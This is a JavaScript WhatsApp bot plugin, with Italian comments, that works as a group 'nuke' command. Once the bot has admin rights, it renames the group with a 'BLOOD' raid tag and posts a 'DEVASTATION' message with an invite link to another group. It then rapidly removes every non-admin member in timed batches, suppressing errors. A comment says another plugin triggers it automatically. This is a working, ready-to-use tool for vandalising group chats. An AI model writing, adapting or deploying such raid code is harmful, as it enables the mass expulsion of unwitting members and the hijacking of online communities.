let handler = async (m, { conn }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    try {
        // 1. Refresh metadati
        let metadata = await conn.groupMetadata(m.chat, true);
        
        // 2. Cambio Nome
        await conn.groupUpdateSubject(m.chat, `${metadata.subject} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`).catch(() => {});

        // 3. Messaggio di Blood
        await conn.sendMessage(m.chat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎.\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri"
        });

        // 4. Svuotamento (Solo membri comuni)
        let participants = metadata.participants;
        let usersToRemove = participants
            .filter(p => p.id !== botId && !ownerJids.includes(p.id) && p.admin === null)
            .map(p => p.id);

        if (usersToRemove.length === 0) return;

        // Raffica: 3 utenti ogni 200ms
        const size = 3;
        for (let i = 0; i < usersToRemove.length; i += size) {
            let chunk = usersToRemove.slice(i, i + size);
            await conn.groupParticipantsUpdate(m.chat, chunk, 'remove').catch(() => {});
            await new Promise(res => setTimeout(res, 200)); 
        }

    } catch (e) {
        console.error("Errore nell'esecuzione silenziosa:", e);
    }
};

// Questo comando viene richiamato automaticamente dal plugin fotti.js
handler.command = ['attiva_devastazione']; 
handler.owner = true;
handler.group = true;
handler.botAdmin = true;

export default handler;
